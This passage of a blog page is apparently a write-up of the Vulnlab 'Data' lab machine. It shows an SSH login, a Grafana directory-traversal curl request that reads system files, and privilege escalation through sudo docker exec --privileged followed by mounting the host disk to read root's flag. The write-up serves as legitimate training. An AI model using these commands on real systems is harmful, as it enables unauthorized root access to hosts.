+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ ssh boris@<span class="variable">$ip</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.102.141 (10.10.102.141)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:iNi0vYwM4g6gqjPUqyj4779xFjwk17h4SIgcAv7F57Q.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.102.141<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">boris@10.10.102.141&#x27;</span>s password:</span><br><span class="line">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Jan 24 07:57:07 UTC 2025</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:              99</span><br><span class="line">  Usage of /:   19.8% of 7.69GB   Users logged <span class="keyword">in</span>:        0</span><br><span class="line">  Memory usage: 25%               IP address <span class="keyword">for</span> eth0:    10.10.102.141</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254</span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">ls</span></span><br><span class="line">snap  user.txt</span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Running basic privilege checking and notice that <code>Boris</code> can use <code>docker exec *</code> as sudo</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> boris on ip-10-10-10-11:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User boris may run the following commands on ip-10-10-10-11:</span><br><span class="line">    (root) NOPASSWD: /snap/bin/docker <span class="built_in">exec</span> *</span><br></pre></td></tr></table></figure></div>
+
+<br>
+
+<p>also learn that the website just now was running in docker, that’s why user <code>Grafana</code> was showed in <code>/etc/passwd</code> while using the directory traversal.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>/etc/passwd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</span><br><span class="line">boris:x:1001:1001:,,,:/home/boris:/bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>Therefore, need to use <code>docker exec</code> to get into docker &amp; run as root</p>
+<br>
+
+<p>There are a few ways to use <code>docker exec</code>:</p>
+<ol>
+<li>get the container ID of the docker using ‘docker ps’ which seems to be impossible as it requires &#x3D;&#x3D;root privilege&#x3D;&#x3D;, but its still possible to get it via the directory traversal from the Grafana vulnerability.</li>
+</ol>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ docker ps</span><br><span class="line">Got permission denied <span class="keyword">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get <span class="string">&quot;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json&quot;</span>: dial unix /var/run/docker.sock: connect: permission denied</span><br><span class="line"></span><br><span class="line">             ------------------------------------ directory traversal --------------------------------------</span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141/grafanahash$ curl --path-as-is http://<span class="variable">$ip</span>:3000/public/plugins/zipkin/../../../../../../../../etc/hostname</span><br><span class="line">e6ff5b1cbc85 [Container ID]</span><br><span class="line"></span><br><span class="line">                  ------------------------------------ docker <span class="built_in">exec</span> ------------------------------------</span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">sudo</span> /snap/bin/docker <span class="built_in">exec</span> --privileged -it -u 0 e6ff5b1cbc85 /bin/bash</span><br><span class="line">bash-5.1# <span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li>use the username retrieved from the <code>/etc/passwd</code> recovered from the directory traversal before.</li>
+</ol>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[from the /etc/passwd <span class="keyword">in</span> directory traversal]</span><br><span class="line">grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin</span><br><span class="line"></span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">sudo</span> /snap/bin/docker <span class="built_in">exec</span> --privileged -it -u 0 grafana /bin/bash</span><br><span class="line">bash-5.1# <span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Using <code>fdisk -l</code>, revelas <code>/dev/xvda/</code> disk, showing it’s an 8GB disk with a single Linux partition <code>/dev/xvda1</code>. Suggesting device is reachable from within the docker. Therefore, <code>mount</code> is possible.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# fdisk -l</span><br><span class="line">Disk /dev/xvda: 8192 MB, 8589934592 bytes, 16777216 sectors</span><br><span class="line">6367 cylinders, 85 heads, 31 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Device   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type</span><br><span class="line">/dev/xvda1 *  0,32,33     20,84,31          2048   16777182   16775135 8190M 83 Linux</span><br></pre></td></tr></table></figure></div>
+
+<p>Create a dummy directory and <code>mount</code> <code>/dev/xvda1</code> to the directory created and get access to <code>/root/</code> content.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# <span class="built_in">pwd</span></span><br><span class="line">/usr/share/grafana</span><br><span class="line">bash-5.1# <span class="built_in">mkdir</span> mntroot</span><br><span class="line">bash-5.1# mount /dev/xvda1 ./mntroot/</span><br><span class="line">bash-5.1# <span class="built_in">ls</span></span><br><span class="line">LICENSE          README.md        bin              plugins-bundled  mntroot</span><br><span class="line">NOTICE.md        VERSION          conf             public           scripts</span><br><span class="line">bash-5.1# <span class="built_in">cd</span> mntroot</span><br><span class="line">bash-5.1# <span class="built_in">ls</span></span><br><span class="line">bin             home            lib64           opt             sbin            tmp             vmlinuz.old</span><br><span class="line">boot            initrd.img      lost+found      proc            snap            usr</span><br><span class="line">dev             initrd.img.old  media           root            srv             var</span><br><span class="line">etc             lib             mnt             run             sys             vmlinuz</span><br><span class="line">bash-5.1# <span class="built_in">cd</span> root</span><br><span class="line">bash-5.1# <span class="built_in">ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">bash-5.1# <span class="built_in">cat</span> root.txt</span><br><span class="line">VL&#123;*****&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-data/data-pwn.png"
+                      alt="pwn"
+                ></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Vulnlab/">#Vulnlab</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Easy/">#Easy</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/01/28/Vulnlab-Down/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Vulnlab-Down</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/01/21/Vulnlab-Baby/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Vulnlab-Baby</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Vulnlab-Data</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#User"><span class="nav-text">User</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Grafana"><span class="nav-text">Grafana</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crack-the-Hash"><span class="nav-text">Crack the Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root"><span class="nav-text">Root</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        5 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
